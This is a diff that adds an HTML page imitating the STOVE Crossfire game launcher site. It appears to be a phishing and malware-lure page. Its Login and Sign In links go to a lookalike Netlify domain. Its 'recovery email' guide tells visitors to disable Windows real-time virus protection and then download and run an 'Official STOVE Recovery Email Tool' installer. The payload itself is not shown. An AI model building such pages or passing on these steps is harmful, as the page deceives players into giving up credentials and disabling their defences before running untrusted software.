@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>STOVE - Crossfire Launcher</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Floating Sidebar -->
+    <aside class="floating-sidebar">
+        <div class="sidebar-item topup-section">
+            <a href="#" title="Top-Up">
+                <svg viewBox="0 0 100 100" fill="currentColor">
+                    <circle cx="50" cy="30" r="15" fill="white"/>
+                    <path d="M 30 60 Q 30 45 50 45 Q 70 45 70 60 L 70 80 Q 70 85 65 85 L 35 85 Q 30 85 30 80 Z" fill="white"/>
+                </svg>
+                <span>TOP-UP</span>
+            </a>
+        </div>
+
+        <div class="sidebar-item facebook-section">
+            <a href="https://facebook.com" target="_blank" title="Facebook">
+                <svg viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                </svg>
+            </a>
+        </div>
+
+        <div class="sidebar-item youtube-section">
+            <a href="https://youtube.com" target="_blank" title="YouTube">
+                <svg viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/>
+                </svg>
+            </a>
+        </div>
+
+        <div class="sidebar-item discord-section">
+            <a href="https://discord.com" target="_blank" title="Discord">
+                <svg viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.211.375-.444.865-.607 1.252a18.27 18.27 0 0 0-5.487 0c-.163-.387-.399-.877-.607-1.252a.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.056 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.873-1.295 1.226-1.994.021-.04.001-.088-.041-.104a13.107 13.107 0 0 1-1.872-.892.083.083 0 0 1-.008-.138c.125-.093.25-.19.371-.287a.079.079 0 0 1 .082-.01c3.928 1.793 8.18 1.793 12.062 0a.078.078 0 0 1 .083.011c.12.098.246.195.371.288a.083.083 0 0 1-.006.137 12.28 12.28 0 0 1-1.871.892.083.083 0 0 0-.041.105c.354.699.764 1.365 1.225 1.994a.078.078 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.082.082 0 0 0 .032-.056c.5-4.718-.838-8.812-3.549-12.454a.06.06 0 0 0-.031-.028zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.952-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.952 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.952-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/>
+                </svg>
+            </a>
+        </div>
+
+        <div class="sidebar-item vip-cafe-section">
+            <a href="#" title="VIP PC Cafe">
+                <svg viewBox="0 0 100 100" fill="currentColor">
+                    <rect x="20" y="30" width="60" height="45" rx="5" fill="white" stroke="white" stroke-width="2"/>
+                    <rect x="25" y="35" width="50" height="30" fill="#FF6B35"/>
+                    <path d="M 35 65 L 35 75 M 50 65 L 50 75 M 65 65 L 65 75" stroke="white" stroke-width="2"/>
+                </svg>
+                <span>VIP PC Cafe</span>
+            </a>
+        </div>
+
+        <div class="sidebar-item stove-app-section">
+            <a href="#" title="STOVE APP">
+                <div class="qr-placeholder">
+                    <svg viewBox="0 0 100 100" fill="currentColor">
+                        <rect x="10" y="10" width="80" height="80" fill="white"/>
+                        <rect x="15" y="15" width="20" height="20" fill="#FF6B35"/>
+                        <rect x="65" y="15" width="20" height="20" fill="#FF6B35"/>
+                        <rect x="15" y="65" width="20" height="20" fill="#FF6B35"/>
+                        <rect x="40" y="40" width="20" height="20" fill="#FF6B35"/>
+                    </svg>
+                </div>
+                <span>STOVE APP</span>
+            </a>
+        </div>
+    </aside>
+
+    <!-- Header -->
+    <header class="stove-header">
+        <div class="header-container">
+            <!-- Logo -->
+            <div class="logo">
+                <svg class="logo-icon" viewBox="0 0 40 40" width="40" height="40">
+                    <rect width="40" height="40" fill="#FF6B35" rx="4"/>
+                    <text x="20" y="26" font-size="20" font-weight="bold" fill="white" text-anchor="middle">S</text>
+                </svg>
+                <span class="stove-text">STOVE</span>
+            </div>
+
+            <!-- Navigation Menu -->
+            <nav class="nav-menu">
+                <a href="#" class="nav-link">Support</a>
+                <a href="#" class="nav-link">Top-Up</a>
+                <a href="#" class="nav-link external-link">
+                    CF-Lounge
+                    <svg width="12" height="12" viewBox="0 0 12 12" fill="currentColor">
+                        <path d="M10 2H2v8h8V2zm-1 7H3V3h6v6z"/>
+                        <path d="M8 4h3v3"/>
+                    </svg>
+                </a>
+            </nav>
+
+            <!-- Right Actions -->
+            <div class="header-actions">
+                <button class="install-btn">Install STOVE</button>
+                
+                <!-- Settings Dropdown -->
+                <div class="dropdown">
+                    <button class="icon-btn" id="settingsBtn" data-dropdown="settings">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <circle cx="12" cy="12" r="3"></circle>
+                            <path d="M12 1v6m0 6v6M4.22 4.22l4.24 4.24m2.12 2.12l4.24 4.24M1 12h6m6 0h6m-15.78 7.78l4.24-4.24m2.12-2.12l4.24-4.24"></path>
+                        </svg>
+                    </button>
+                    <div class="dropdown-menu" id="settingsDropdown">
+                        <a href="#" class="dropdown-item">Settings</a>
+                        <a href="#" class="dropdown-item">Preferences</a>
+                        <a href="#" class="dropdown-item">Help</a>
+                    </div>
+                </div>
+
+                <!-- Bookmarks -->
+                <button class="icon-btn" id="bookmarkBtn">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"></path>
+                    </svg>
+                </button>
+
+                <!-- Account Dropdown -->
+                <div class="dropdown">
+                    <button class="register-btn" id="accountBtn" data-dropdown="account">
+                        Register
+                    </button>
+                    <div class="dropdown-menu" id="accountDropdown">
+                        <a href="https://accounts.onstove.com/signup/cf/agree?style_type=cf" class="dropdown-item">Create Account</a>
+                        <a href="https://cfpg-onstove-com.netlify.app/login" class="dropdown-item">Sign In</a>
+                    </div>
+                </div>
+
+                <a href="https://cfpg-onstove-com.netlify.app/login" class="login-btn">Login</a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-content">
+            <h1>How to Set Up Recovery Email for CF STOVE</h1>
+            <div class="steps-container">
+                <div class="step-card">
+                    <div class="step-header">
+                        <span class="step-number">1</span>
+                        <h3>Open Windows Settings</h3>
+                    </div>
+                    <img src="./Image/Keep1.png" alt="Windows Settings" class="guide-image">
+                </div>
+
+                <div class="step-card">
+                    <div class="step-header">
+                        <span class="step-number">2</span>
+                        <h3>Navigate to Privacy & Security</h3>
+                    </div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-header">
+                        <span class="step-number">3</span>
+                        <h3>Select Windows Security</h3>
+                    </div>
+                    <img src="./Image/Keep3.png" alt="Windows Security" class="guide-image">
+                </div>
+
+                <div class="step-card">
+                    <div class="step-header">
+                        <span class="step-number">4</span>
+                        <h3>Click on Virus and Threat Protection</h3>
+                    </div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-header">
+                        <span class="step-number">5</span>
+                        <h3>Select Manage Settings under Virus and Threat Protection</h3>
+                    </div>
+                    <img src="./Image/Keep4.png" alt="Manage Settings" class="guide-image">
+                </div>
+
+                <div class="step-card">
+                    <div class="step-header">
+                        <span class="step-number">6</span>
+                        <h3>Disable real-time protection to configure your Recovery Email</h3>
+                    </div>
+                    <img src="./Image/Keep5.png" alt="Disable Protection" class="guide-image">
+                </div>
+
+                <div class="step-card highlight">
+                    <div class="step-header">
+                        <span class="step-number">7</span>
+                        <h3>Download the Official STOVE Recovery Email Tool</h3>
+                    </div>
+                    <button class="download-btn">DOWNLOAD NOW</button>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-header">
+                        <span class="step-number">8</span>
+                        <h3>Locate the downloaded file in your Downloads folder and run the installer</h3>
+                    </div>
+                    <img src="./Image/Keep.jpeg" alt="Run Installer" class="guide-image">
+                </div>
+
+                <div class="step-card success">
+                    <div class="success-content">
+                        <h3>Installation Complete!</h3>
+                        <p>Your recovery email is now configured.</p>
+                    </div>
+                    <img src="./Image/image.png" alt="Setup Complete" class="guide-image">
+                </div>
+            </div>
+         </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="stove-footer">
+        <div class="footer-container">
+            <div class="footer-columns">
+                <!-- NEWS Column -->
+                <div class="footer-column">
+                    <h4 class="footer-title">NEWS</h4>
+                    <ul class="footer-links">
+                        <li><a href="#">Latest Updates</a></li>
+                        <li><a href="#">Patch Notes</a></li>
+                        <li><a href="#">Events</a></li>
+                        <li><a href="#">Announcements</a></li>
+                    </ul>
+                </div>
+
+                <!-- ACCOUNT Column -->
+                <div class="footer-column">
+                    <h4 class="footer-title">ACCOUNT</h4>
+                    <ul class="footer-links">
+                        <li><a href="#">Account Settings</a></li>
+                        <li><a href="#">Recovery Email</a></li>
+                        <li><a href="#">Security</a></li>
+                        <li><a href="#">Profile</a></li>
+                    </ul>
+                </div>
+
+                <!-- COMMUNITY Column -->
+                <div class="footer-column">
+                    <h4 class="footer-title">COMMUNITY</h4>
+                    <ul class="footer-links">
+                        <li><a href="#">Forum</a></li>
+                        <li><a href="#">Discord</a></li>
+                        <li><a href="#">Social Media</a></li>
+                        <li><a href="#">Support</a></li>
+                    </ul>
+                </div>
+
+                <!-- GAME Column -->
+                <div class="footer-column">
+                    <h4 class="footer-title">GAME</h4>
+                    <ul class="footer-links">
+                        <li><a href="#">Game Download</a></li>
+                        <li><a href="#">System Requirements</a></li>
+                        <li><a href="#">Game Guide</a></li>
+                        <li><a href="#">FAQ</a></li>
+                    </ul>
+                </div>
+
+                <!-- SUPPORT Column -->
+                <div class="footer-column">
+                    <h4 class="footer-title">SUPPORT</h4>
+                    <ul class="footer-links">
+                        <li><a href="#">Help Center</a></li>
+                        <li><a href="#">Contact Us</a></li>
+                        <li><a href="#">Report Issue</a></li>
+                        <li><a href="#">Troubleshooting</a></li>
+                    </ul>
+                </div>
+
+                <!-- Social Media & Follow Column -->
+                <div class="footer-column social-column">
+                    <h4 class="footer-title">Follow STOVE</h4>
+                    <div class="social-links">
+                        <a href="#" class="social-icon facebook" title="Facebook">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                            </svg>
+                        </a>
+                        <a href="#" class="social-icon instagram" title="Instagram">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                                <path d="M12 0C8.74 0 8.333.015 7.053.072 5.775.132 4.905.333 4.117.6c-.71.275-1.313.64-1.91 1.236-.595.595-.96 1.203-1.236 1.91-.266.788-.467 1.658-.527 2.936C.015 8.333 0 8.74 0 12s.015 3.667.072 4.947c.06 1.277.261 2.148.527 2.936.276.71.64 1.313 1.236 1.91.595.595 1.203.96 1.91 1.236.788.266 1.658.467 2.936.527C8.333 23.985 8.74 24 12 24s3.667-.015 4.947-.072c1.277-.06 2.148-.261 2.936-.527.71-.276 1.313-.64 1.91-1.236.595-.595.96-1.203 1.236-1.91.266-.788.467-1.658.527-2.936.057-1.28.072-1.687.072-4.947s-.015-3.667-.072-4.947c-.06-1.277-.261-2.148-.527-2.936-.276-.71-.64-1.313-1.236-1.91-.595-.595-1.203-.96-1.91-1.236-.788-.266-1.658-.467-2.936-.527C15.667.015 15.26 0 12 0zm0 2.16c3.203 0 3.585.009 4.849.07 1.171.054 1.805.244 2.227.408.562.217.96.477 1.382.896.419.42.679.819.896 1.381.164.422.354 1.057.408 2.227.061 1.264.07 1.645.07 4.849 0 3.203-.009 3.585-.07 4.849-.054 1.171-.244 1.805-.408 2.227-.217.562-.477.96-.896 1.382-.42.419-.819.679-1.381.896-.422.164-1.057.354-2.227.408-1.264.061-1.645.07-4.849.07-3.203 0-3.585-.009-4.849-.07-1.171-.054-1.805-.244-2.227-.408-.562-.217-.96-.477-1.382-.896-.419-.42-.679-.819-.896-1.381-.164-.422-.354-1.057-.408-2.227-.061-1.264-.07-1.645-.07-4.849 0-3.203.009-3.585.07-4.849.054-1.171.244-1.805.408-2.227.217-.562.477-.96.896-1.382.42-.419.819-.679 1.381-.896.422-.164 1.057-.354 2.227-.408 1.264-.061 1.645-.07 4.849-.07zM5.838 12a6.162 6.162 0 1 1 12.324 0 6.162 6.162 0 0 1-12.324 0zM12 16a4 4 0 1 1 0-8 4 4 0 0 1 0 8zm4.965-10.322a1.44 1.44 0 1 1 2.881.001 1.44 1.44 0 0 1-2.881-.001z"/>
+                            </svg>
+                        </a>
+                        <a href="#" class="social-icon youtube" title="YouTube">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                                <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/>
+                            </svg>
+                        </a>
+                        <a href="#" class="social-icon twitch" title="Twitch">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                                <path d="M11.571 4.714h1.429v4.286h-1.429V4.714zM17.143 4.714h1.429v4.286h-1.429V4.714zM6.857 7.429H8v11.429H6.857V7.429zm5.714 0h1.429v11.429h-1.429V7.429zm5.714 0h1.429v11.429h-1.429V7.429zM24 0v24H0V0h24zM4.571 4.714v14.571H3.143V4.714h1.428z"/>
+                            </svg>
+                        </a>
+                        <a href="#" class="social-icon discord" title="Discord">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                                <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.211.375-.444.865-.607 1.252a18.27 18.27 0 0 0-5.487 0c-.163-.387-.399-.877-.607-1.252a.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.056 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.873-1.295 1.226-1.994.021-.04.001-.088-.041-.104a13.107 13.107 0 0 1-1.872-.892.083.083 0 0 1-.008-.138c.125-.093.25-.19.371-.287a.079.079 0 0 1 .082-.01c3.928 1.793 8.18 1.793 12.062 0a.078.078 0 0 1 .083.011c.12.098.246.195.371.288a.083.083 0 0 1-.006.137 12.28 12.28 0 0 1-1.871.892.083.083 0 0 0-.041.105c.354.699.764 1.365 1.225 1.994a.078.078 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.082.082 0 0 0 .032-.056c.5-4.718-.838-8.812-3.549-12.454a.06.06 0 0 0-.031-.028zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.952-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.952 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.952-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/>
+                            </svg>
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Footer Bottom -->
+            <div class="footer-bottom">
+                <div class="footer-copyright">
+                    <p>&copy; 2024 STOVE - Crossfire Launcher. All rights reserved.</p>
+                </div>
+                <div class="footer-legal">
+                    <a href="#">Terms of Service</a>
+                    <a href="#">Privacy Policy</a>
+                    <a href="#">Contact Us</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
